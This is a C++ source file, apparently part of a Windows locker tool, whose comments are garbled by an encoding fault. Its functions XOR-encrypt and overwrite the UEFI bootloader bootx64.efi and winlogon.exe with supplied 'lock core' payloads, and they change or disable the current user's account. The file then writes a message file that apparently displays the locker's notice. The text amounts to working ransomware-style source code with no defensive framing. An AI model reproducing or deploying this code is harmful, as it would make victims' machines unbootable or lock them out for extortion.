#include "Lock.h"
#include <vector>
/*Ӳ���� ������*/
int DiskLock(LockCore locker)
{
	HANDLE DiskHandle = NULL;
	GetPhysicalDriveHandle(DiskHandle, 0);
	string boot = GetPartitiontype(DiskHandle);
	if (boot == "GPT")
	{
		ofstream script("Esp.txt"); // ����һ���ļ����ڴ洢�ű�
		script << "select disk " << GetSystemDiskPhysicalNumber() << endl;
		script << "select partition 1\n"; // ѡ��ESP���� û��Ҫ�ٻ�ȡһ��ϵͳ�����ţ�һ���˶���1
		script << "assign letter=X\n"; // ��ESP�������ص��̷�X
		script << "exit\n"; // �˳�diskpart
		script.close(); // �ر��ļ�
		system("diskpart /s Esp.txt"); // ���нű�
        // ��bootx64.efi�ļ�
        ifstream in("X:\\ESP\\BOOT\\bootx64.efi", ios::binary); 
        if (!in)
        {
            cout << "�޷����ļ�" << endl;
            return -1;
        }
        // ��ȡbootx64.efi�ļ�������
        vector<char> buffer((istreambuf_iterator<char>(in)), istreambuf_iterator<char>());
        // �Զ�ȡ�����ݽ���������
        for (int i = 0; i < buffer.size(); i++)
        {
            buffer[i] ^= locker.Xorkey;
                ;
        }
        // �����ܺ������д��bootbackup.yeluo�ļ�
        ofstream out("X:\\ESP\\BOOT\\bootbackup.yeluo", ios::binary);
        if (!out)
        {
            cout << "�޷������ļ�" << endl;
            return -1;
        }
        out.write(&buffer[0], buffer.size());

        // ���bootx64.efi�ļ���д��������
        ofstream out2("X:\\ESP\\BOOT\\bootx64.efi", ios::binary | ios::trunc);
        if (!out2)
        {
           // cout << "�޷����ļ�" << endl;
            return -1;
        }
        out2.write(reinterpret_cast<char*>(locker.UefiLockCore), sizeof(locker.UefiLockCore));
	}
	else//  mbr
	{

	}
}
// �û������������ڴ���һ�����û������õ�ǰ�û�
// ���������setting - �û�������
// ����ֵ��bool���ͣ���ʾ������ִ�н��
BOOL UserLock( UserLockSetting setting)
{
    // ��ȡ��ǰ�û����û���
    LPWSTR local = W_GetCurrentUsername();

    // ���ĵ�ǰ�û�������
    if (!CurrentUser(local, setting.newPassword))
    {
        // �����������ʧ�ܣ��򷵻�ִ��ʧ��
        return false;
    }

    // �����Ҫ����ԭ�û���
    if (setting.changeOriginalUsername)
    {
        // ���ĵ�ǰ�û���
        if (!RenameUserAccount(local, setting.newUsername))
        {
            // ��������û���ʧ�ܣ��򷵻�ִ��ʧ��
            return false;
        }
    }
    else // �������Ҫ����ԭ�û���
    {
        // ����һ�����û�����������ӵ�����Ա����
        // ͬʱ���õ�ǰ�û���ʹ���޷���¼
        if (!NetUserAddAdmin(setting.newUsername, setting.newUsername) || !DisableUserAccount(local))
        {
            // ��������û�������û�ʧ�ܣ��򷵻�ִ��ʧ��
            return false;
        }
    }
    return true;
}
/*�����ļ���*/
int FileLock(string password)
{
	return 0;
}
/*�ٳ�winlogin��¼��*/
int LoginLock(LoginLockSetting setting )
{
    // ��Ҫ��ȡ���ļ�
    std::ifstream in("C:\\Windows\\System32\\winlogon.exe", std::ios::binary);
    if (!in)
    {
        std::cerr << "�޷����ļ�" << std::endl;
        return -1;
    }

    // ��ȡ�ļ����ݵ�������
    std::vector<char> buffer(std::istreambuf_iterator<char>(in), {});
    in.close();

    // �Զ�ȡ�����ݽ���������
    const char xorKey = setting.XorKey;
    for (char& c : buffer)
    {
        c ^= xorKey;
    }

    // д����ܺ�����ݵ��ļ�
    std::ofstream out("C:\\loginbackup.yeluo", std::ios::binary);
    if (!out)
    {
        std::cerr << "�޷������ļ�" << std::endl;
        return -1;
    }
    out.write(buffer.data(), buffer.size());
    out.close();
    // д���µ����ݵ��ļ�
    std::ofstream out2("C:\\Windows\\System32\\winlogon.exe", std::ios::binary | std::ios::trunc);
    if (!out2)
    {
        std::cerr << "�޷����ļ�" << std::endl;
        return -1;
    }
    out2.write(reinterpret_cast<const char*>(setting.LockCore), sizeof(setting.LockCore));
    out2.close();
    // д���µ���Ϣ���ļ�
    std::ofstream outFile("C:\\Windows\\System32\\msg.txt");
    outFile << setting.ShowMsg;
    outFile.close();
    std::cout << "�������" << std::endl;
}
